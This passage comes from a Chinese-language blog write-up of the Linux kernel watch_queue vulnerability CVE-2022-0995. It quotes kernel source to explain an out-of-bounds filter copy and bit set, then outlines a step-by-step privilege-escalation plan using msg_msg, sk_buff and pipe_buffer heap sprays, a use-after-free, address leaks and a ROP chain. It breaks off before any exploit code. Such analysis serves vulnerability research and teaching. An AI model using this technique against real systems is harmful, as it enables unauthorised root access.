subsystem 中 Event Filter 的实现</h2><p>前面我们抄了一大段的 kernel document，现在我们来深入源码看一下 watch queue subsystem 的实现机制</p><p>当我们调用 <code>ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, &amp;filter)</code> 时，会调用 <code>do_vfs_ioctl()</code> 判断 cmd 进行处理，而我们的 <code>IOC_WATCH_QUEUE_SET_FILTER</code> 不在其列表中，所以最后会走到 <code>vfs_ioctl()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE3(ioctl, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, fd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, arg)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span> =</span> fdget(fd);<br><span class="hljs-type">int</span> error;<br><br><span class="hljs-keyword">if</span> (!f.file)<br><span class="hljs-keyword">return</span> -EBADF;<br><br>error = security_file_ioctl(f.file, cmd, arg);<br><span class="hljs-keyword">if</span> (error)<br><span class="hljs-keyword">goto</span> out;<br><br>error = do_vfs_ioctl(f.file, fd, cmd, arg);<br><span class="hljs-keyword">if</span> (error == -ENOIOCTLCMD)<br>error = vfs_ioctl(f.file, cmd, arg);<br><br>out:<br>fdput(f);<br><span class="hljs-keyword">return</span> error;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 <code>vfs_ioctl()</code> 中会调用 file 结构体自身的函数表中的 <code>unlocked_ioctl</code> 指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">vfs_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br><span class="hljs-type">int</span> error = -ENOTTY;<br><br><span class="hljs-keyword">if</span> (!filp-&gt;f_op-&gt;unlocked_ioctl)<br><span class="hljs-keyword">goto</span> out;<br><br>error = filp-&gt;f_op-&gt;unlocked_ioctl(filp, cmd, arg);<br><span class="hljs-keyword">if</span> (error == -ENOIOCTLCMD)<br>error = -ENOTTY;<br> out:<br><span class="hljs-keyword">return</span> error;<br>&#125;<br>EXPORT_SYMBOL(vfs_ioctl);<br></code></pre></td></tr></table></figure><p>那么这里我们需要将目光放回管道的创建流程中分配文件描述符的部分，存在如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">do_pipe2()<br>    __do_pipe_flags()<br>    create_pipe_files()<br>    alloc_file_pseudo()<br>    alloc_file()<br></code></pre></td></tr></table></figure><p><code>alloc_file()</code> 分配一个 file 结构体并将其函数表设为上层调用传入的函数表，而在 <code>create_pipe_files()</code> 中传入的函数表为 <code>pipefifo_fops</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">pipefifo_fops</span> =</span> &#123;<br>.open= fifo_open,<br>.llseek= no_llseek,<br>.read_iter= pipe_read,<br>.write_iter= pipe_write,<br>.poll= pipe_poll,<br>.unlocked_ioctl= pipe_ioctl,<br>.release= pipe_release,<br>.fasync= pipe_fasync,<br>.splice_write= iter_file_splice_write,<br>&#125;;<br></code></pre></td></tr></table></figure><p>因此最终调用到的是 <code>pipe_ioctl()</code>，对于 cmd <code>IOC_WATCH_QUEUE_SET_FILTER</code> 而言，最终会调用 <code>watch_queue_set_filter()</code> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">pipe_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> filp-&gt;private_data;<br><span class="hljs-type">int</span> count, head, tail, mask;<br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> FIONREAD:<br>__pipe_lock(pipe);<br>count = <span class="hljs-number">0</span>;<br>head = pipe-&gt;head;<br>tail = pipe-&gt;tail;<br>mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">while</span> (tail != head) &#123;<br>count += pipe-&gt;bufs[tail &amp; mask].len;<br>tail++;<br>&#125;<br>__pipe_unlock(pipe);<br><br><span class="hljs-keyword">return</span> put_user(count, (<span class="hljs-type">int</span> __user *)arg);<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-keyword">case</span> IOC_WATCH_QUEUE_SET_SIZE: &#123;<br><span class="hljs-type">int</span> ret;<br>__pipe_lock(pipe);<br>ret = watch_queue_set_size(pipe, arg);<br>__pipe_unlock(pipe);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-keyword">case</span> IOC_WATCH_QUEUE_SET_FILTER:<br><span class="hljs-keyword">return</span> watch_queue_set_filter(<br>pipe, (<span class="hljs-keyword">struct</span> watch_notification_filter __user *)arg);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> -ENOIOCTLCMD;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1>0x01.漏洞分析</h1><p>漏洞便发生在 <code>watch_queue_set_filter()</code>中将 filter 数组从用户空间拷贝到内核空间的过程当中，现在让我们仔细审视这个函数的执行流程，在一开始时首先会将用户空间的 <code>watch_notification_filter</code> 结构拷贝到内核空间：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">watch_queue_set_filter</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe,</span><br><span class="hljs-params">    <span class="hljs-keyword">struct</span> watch_notification_filter __user *_filter)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification_type_filter</span> *<span class="hljs-title">tf</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification_filter</span> <span class="hljs-title">filter</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_type_filter</span> *<span class="hljs-title">q</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_filter</span> *<span class="hljs-title">wfilter</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_queue</span> *<span class="hljs-title">wqueue</span> =</span> pipe-&gt;watch_queue;<br><span class="hljs-type">int</span> ret, nr_filter = <span class="hljs-number">0</span>, i;<br><br><span class="hljs-keyword">if</span> (!wqueue)<br><span class="hljs-keyword">return</span> -ENODEV;<br><br><span class="hljs-keyword">if</span> (!_filter) &#123;<br><span class="hljs-comment">/* Remove the old filter */</span><br>wfilter = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">goto</span> <span class="hljs-built_in">set</span>;<br>&#125;<br><br><span class="hljs-comment">/* Grab the user&#x27;s filter specification */</span><br><span class="hljs-keyword">if</span> (copy_from_user(&amp;filter, _filter, <span class="hljs-keyword">sizeof</span>(filter)) != <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-keyword">if</span> (filter.nr_filters == <span class="hljs-number">0</span> ||<br>    filter.nr_filters &gt; <span class="hljs-number">16</span> ||<br>    filter.__reserved != <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br></code></pre></td></tr></table></figure><p>之后 <code>memdup_user()</code> 分配一块临时空间，将用户空间的 filter 数组拷贝至该临时空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">tf = memdup_user(_filter-&gt;filters, filter.nr_filters * <span class="hljs-keyword">sizeof</span>(*tf));<br><span class="hljs-keyword">if</span> (IS_ERR(tf))<br><span class="hljs-keyword">return</span> PTR_ERR(tf);<br></code></pre></td></tr></table></figure><p>接下来会遍历每一个 <code>watch_notification_type_filter</code> 结构，记录 type 在指定范围的 filter 的数量到变量 <code>nr_filter</code> 中，这里其判断一个 type 是否合法的范围是 <code>sizeof(wfilter-&gt;type_filter) * 8</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">ret = -EINVAL;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; filter.nr_filters; i++) &#123;<br><span class="hljs-keyword">if</span> ((tf[i].info_filter &amp; ~tf[i].info_mask) ||<br>    tf[i].info_mask &amp; WATCH_INFO_LENGTH)<br><span class="hljs-keyword">goto</span> err_filter;<br><span class="hljs-comment">/* Ignore any unknown types */</span><br><span class="hljs-keyword">if</span> (tf[i].type &gt;= <span class="hljs-keyword">sizeof</span>(wfilter-&gt;type_filter) * <span class="hljs-number">8</span>)<br><span class="hljs-keyword">continue</span>;<br>nr_filter++;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来会分配真正储存 filter 的的空间，这里用了一个 <code>struct_size()</code> 导出的大小为 <code>sizeof(wfilter) + sizeof(filters) * nr_filter</code>（感兴趣的同学可以自行阅读源码），注意到这里计算大小用的是我们前面遍历计算得到的 <code>nr_filter</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Now we need to build the internal filter from only the relevant</span><br><span class="hljs-comment"> * user-specified filters.</span><br><span class="hljs-comment"> */</span><br>ret = -ENOMEM;<br>wfilter = kzalloc(struct_size(wfilter, filters, nr_filter), GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!wfilter)<br><span class="hljs-keyword">goto</span> err_filter;<br>wfilter-&gt;nr_filters = nr_filter;<br></code></pre></td></tr></table></figure><p>之后是将 filter 数组拷贝到分配的空间上，<strong>我们的第一个漏洞便出现在这里，其判断 type 是否合法使用的是</strong> <code>sizeof(wfilter-&gt;type_filter) * BITS_PER_LONG)</code> ，<strong>与前面 nr_filter 的计算存在不一致性</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">q = wfilter-&gt;filters;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; filter.nr_filters; i++) &#123;<br><span class="hljs-keyword">if</span> (tf[i].type &gt;= <span class="hljs-keyword">sizeof</span>(wfilter-&gt;type_filter) * BITS_PER_LONG)<br><span class="hljs-keyword">continue</span>;<br><br>q-&gt;type= tf[i].type;<br>q-&gt;info_filter= tf[i].info_filter;<br>q-&gt;info_mask= tf[i].info_mask;<br>q-&gt;subtype_filter[<span class="hljs-number">0</span>]= tf[i].subtype_filter[<span class="hljs-number">0</span>];<br>__set_bit(q-&gt;type, wfilter-&gt;type_filter);<br>q++;<br>&#125;<br></code></pre></td></tr></table></figure><p>而 <code>BITS_PER_LONG</code> 定义于 <code>/include/asm-generic/bitsperlong.h</code> 中，<strong>在 32 位下为 32，64 位下为64</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_64BIT</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BITS_PER_LONG 64</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BITS_PER_LONG 32</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* CONFIG_64BIT */</span></span><br></code></pre></td></tr></table></figure><p>那么前后对 type 范围的计算便存在不一致，我们不难想到的是<strong>我们可以指定几个 filter 的 type 为（计算 nr_filter 时的合法 type 上限值，拷贝 filter 时的合法 type 上限值）这个范围内的特定值，这样就能越界拷贝一定数量的 filter，从而完成堆上的越界写</strong></p><p>那么这里我们容易计算得出触发第一个漏洞的 type 的范围应为 <code>[0x80, 0x400)</code></p><p>而<strong>第二个漏洞则存在于上面这段代码中对</strong> <code>__set_bit()</code> <strong>的调用，该函数定义如下：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> __set_bit(<span class="hljs-type">int</span> nr, <span class="hljs-keyword">volatile</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *addr)<br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> mask = BIT_MASK(nr);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p = ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)addr) + BIT_WORD(nr);<br><br>*p  |= mask;<br>&#125;<br></code></pre></td></tr></table></figure><p>其作用便是<strong>将 addr 偏移 BIT_WORD(nr) 处的 BIT_MASK(mask) 位进行置 1 操作</strong>，这里的 <code>BIT_WORD()</code> 宏主要是除以 long 类型所占位数（64），而 <code>BIT_MASK()</code> 宏则是对 long 类型所占位数求模后结果作为 unsigned long 值 1 左移的位数导出结果数值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BIT_MASK(nr)(UL(1) &lt;&lt; ((nr) % BITS_PER_LONG))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BIT_WORD(nr)((nr) / BITS_PER_LONG)</span><br></code></pre></td></tr></table></figure><p>而传入的第一个参数刚好为 type，由于我们的 type 可以在 <code>[0x80, 0x400)</code> 范围内取，<strong>而分配的 filter 空间却未必有那么大，因此这里存在一个越界置 1 位的漏洞，我们可以通过设置一个较大的 type 完成堆上越界置 1 位的操作</strong></p><p>例如对于 <code>kmalloc-96</code> 而言，我们的对象可以覆盖到下图所示范围（本图来自于 <a href="https://blog.csdn.net/Breeze_CAT/article/details/123845526">breezeO_o师傅的博客</a>）：</p><p><img src="https://s2.loli.net/2022/04/06/KZAFrduvUizs4Dg.png" alt=""></p><h1>0x02.漏洞利用</h1><p>在<a href="https://github.com/Bonfee/CVE-2022-0995">目前公开的 exp</a> 中对该漏洞的利用其实是基于 <code>__set_bit()</code> 进行利用的，因为相较于不好控制的 filter 溢出，越界写 1 位则更方便我们控制一些指针，例如 <code>msg_msg-&gt;m_list</code> 双向链表</p><p>在这份公开的 exp 中使用的其实是与 CVE-2021-22555 相同的利用技巧，只不过篡改 <code>msg_msg</code> 头部的方式不是邻接溢出写 0，而是越界写 1；接下来笔者将<s>大幅拷贝</s>使用与 CVE-2021-22555 相同的利用技巧完成对该漏洞的利用</p><h2 id="提权">提权</h2><h3 id="Step-I-堆喷-msg-msg-，建立主从消息队列，构造重叠辅助消息">Step.I 堆喷 <code>msg_msg</code> ，建立主从消息队列，构造重叠辅助消息</h3><p>现在我们有了一个堆上越界写 1 位，我们该怎么利用呢？比较朴素的一种思想便是覆写一个结构体中的指针，利用 partial overwrite 使得两个这样的结构体的头部指针指向同一个结构体，<strong>从而实现 object overlapping</strong></p><p>那么选用什么样的结构体作为 victim 呢？这里我们选择使用 <code>msg_msg</code> 这一结构体，其长度可控，且开头正好是内核双向链表结构体，我们所能覆写的为其 next 指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msg_msg structure for each message */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br><span class="hljs-type">long</span> m_type;<br><span class="hljs-type">size_t</span> m_ts;<span class="hljs-comment">/* message text size */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">void</span> *security;<br><span class="hljs-comment">/* the actual message follows immediately */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>当我们在一个消息队列上发送多个消息时，会形成如下结构：</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>我们不难想到的是，我们可以在一开始时先创建多个消息队列，并分别在每一个消息队列上发送两条消息，形成如下内存布局，这里为了便利后续利用，第一条消息（主消息）的大小为 96，第二条消息（辅助消息）的大小为 0x400：</p><p><img src="https://s2.loli.net/2022/03/31/ViAM3gDxpl1kQj9.png" alt="image.png"></p><p>之后我们读出其中几个消息队列的主消息以产生空洞，再利用 <code>ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, &amp;filter)</code> 获取到我们刚释放的 <code>msg_msg</code> 结构体的空间</p><p><img src="https://s2.loli.net/2022/04/06/pql2L98kxRvaZzA.png" alt="image.png"></p><p>这里需要注意的是<strong>我们至少要释放两个主消息，因为在分配到 watch_filter 之前 memdup_user() 还需要获取一个对象</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">tf = memdup_user(_filter-&gt;filters, filter.nr_filters * <span class="hljs-keyword">sizeof</span>(*tf));<br><span class="hljs-keyword">if</span> (IS_ERR(tf))<br><span class="hljs-keyword">return</span> PTR_ERR(tf);<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-comment">/* Now we need to build the internal filter from only the relevant</span><br><span class="hljs-comment"> * user-specified filters.</span><br><span class="hljs-comment"> */</span><br>ret = -ENOMEM;<br>wfilter = kzalloc(struct_size(wfilter, filters, nr_filter), GFP_KERNEL);<br></code></pre></td></tr></table></figure><p>对于 <code>__set_bit()</code> 而言其可以置 1 的范围如下图所示，刚好可以覆盖到下一相邻 object 的前 16 字节</p><p><img src="https://s2.loli.net/2022/04/06/KZAFrduvUizs4Dg.png" alt="image.png"></p><p>利用越界置 1 位我们可以覆写到其相邻的主消息的 next 指针，若该位刚好被由 0 变为 1，则我们很容易构造出<strong>在两个消息队列上存在两个主消息指向同一个辅助消息</strong>的这样的局面</p><p><img src="https://s2.loli.net/2022/04/06/NWHMurcU36EsIAp.png" alt="image.png"></p><p>我们可以通过在主从消息中放置对应的值来标识喷射的不同的消息队列，遍历读取所有队列来感知指向了同一辅助消息的两个队列</p><blockquote><p>利用 <code>MSG_COPY</code> 标志位可以读取消息队列上的消息而不释放，参见<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">这里</a></p></blockquote><h3 id="Step-II-释放辅助消息，构造-UAF">Step.II 释放辅助消息，构造 UAF</h3><p>此时我们将辅助消息释放掉，便能成功完成 UAF 的构建，此时<strong>我们仍能通过其中一个消息队列访问到该辅助消息对应 object，但实际上这个 object 已经在 freelist 上了</strong></p><p><img src="https://s2.loli.net/2022/04/06/w9RE63dNuVjcmbp.png" alt="image.png"></p><h3 id="Step-III-堆喷-sk-buff-伪造辅助消息，泄露-UAF-obj-地址">Step.III 堆喷 <code>sk_buff</code> 伪造辅助消息，泄露 UAF obj 地址</h3><p>接下来我们考虑如何利用这个 UAF，因为其仍位于消息队列上所以我们考虑伪造 <code>msg_msg</code> 结构体进行后续的利用，这里我们选用另外一个常用来进行堆喷的结构体——<code>sk_buff</code>，类似于 <code>msg_msg</code>，其同样可以提供近乎任意大小对象的分配写入与释放，但不同的是 <code>msg_msg</code> 由一个 header 加上用户数据组成，而 <code>sk_buff</code> 本身不包含任何用户数据，<strong>用户数据单独存放在一个 object 当中，而 sk_buff 中存放指向用户数据的指针</strong></p><p><img src="https://s2.loli.net/2022/03/31/AV8HsnZj2bUCl4J.png" alt="image.png"></p><p>至于这个结构体的分配与释放也是十分简单，<strong>sk_buff 在内核网络协议栈中代表一个「包」，<strong>我们不难想到的是</strong>我们只需要创建一对 socket，在上面发送与接收数据包就能完成 sk_buff 的分配与释放</strong>，最简单的办法便是用 socketpair 系统调用创建一对 socket，之后对其 read &amp; write 便能完成收发包的工作</p><p>接下来我们考虑如何通过伪造 <code>msg_msg</code> 结构体完成信息泄露，我们不难想到的是可以伪造一个 <code>msg_msg</code> 结构体，将其 <code>m_ts</code> 域设为一个较大值，<strong>从而越界读取到相邻辅助消息的 header，泄露出堆上地址</strong></p><p><img src="https://s2.loli.net/2022/04/06/QEysxG1YmcUTBAj.png" alt="image.png"></p><p>我们泄露出来的是哪个地址？让我们重新将目光放回到消息队列的结构上：</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>我们不难知道的是，该辅助消息的 prev 指针指向其主消息，而该辅助消息的 next 指针指向该消息队列的 <code>msg_queue</code> 结构，这是目前我们已知的两个“堆上地址”</p><p>接下来我们伪造 <code>msg_msg-&gt;next</code>，<strong>将其指向我们的 UAF object 相邻的辅助消息对应的主消息头部往前，从而读出该主消息的头部，泄露出对应的辅助消息的地址</strong>，有了这个辅助消息的地址，再减去 0x400 <strong>便是我们的 UAF 对象的地址</strong></p><blockquote><p>通过伪造 msg_msg-&gt;next 可以完成任意地址读，参见<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">这里</a></p></blockquote><h3 id="Step-IV-堆喷-pipe-buffer，泄露内核基址">Step.IV 堆喷 <code>pipe_buffer</code>，泄露内核基址</h3><p>现在我们已知了可控区域的地址，接下来让我们来考虑泄露内核 .text 段的基址，以及如何劫持 RIP 完成提权</p><p>之前我们为什么将辅助消息的大小设为 0x400？除了方便对齐以外，还有一层考虑就是这个大小刚好有一个十分实用的结构体 <code>pipe_buffer</code> 数组，<strong>既能帮我们泄露内核代码段基址，也能帮我们劫持 RIP</strong></p><p>当我们创建一个管道时，在内核中会生成数个连续的 <code>pipe_buffer</code> 结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个 object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-comment"> *@page: the page containing the data for the pipe buffer</span><br><span class="hljs-comment"> *@offset: offset of data inside the @page</span><br><span class="hljs-comment"> *@len: length of data inside the @page</span><br><span class="hljs-comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span><br><span class="hljs-comment"> *@flags: pipe buffer flags. See above.</span><br><span class="hljs-comment"> *@private: private data owned by the ops.</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在 <code>pipe_buffer</code> 中存在一个函数表成员 <code>pipe_buf_operations</code> ，其指向内核中的函数表 <code>anon_pipe_buf_ops</code>，若我们能够将其读出，便能泄露出内核基址，操作如下：</p><ul><li>利用 <code>sk_buff</code> 修复辅助消息，之后从消息队列中接收该辅助消息，此时该 object 重回 slub 中，但 <code>sk_buff</code> 仍指向该 object</li><li>喷射 <code>pipe_buffer</code>，之后再接收 <code>sk_buff</code> 数据包，<strong>我们便能读出 pipe_buffer 上数据，泄露内核基址</strong></li></ul><h3 id="Step-V-伪造-pipe-buffer，构造-ROP，劫持-RIP，完成提权">Step.V 伪造 pipe_buffer，构造 ROP，劫持 RIP，完成提权</h3><p>当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针，而 UAF object 的地址对我们而言是已知的，因此<strong>我们可以直接利用 sk_buff 在 UAF object 上伪造函数表与构造 ROP chain，再选一条足够合适的 gadget 完成栈迁移便能劫持 RIP 完成提权</strong></p><p><img src="https://s2.loli.net/2022/04/06/P8AlaFMCqeSObn2.png" alt="image.png"></p><h3 id="Final-EXPLOIT">Final 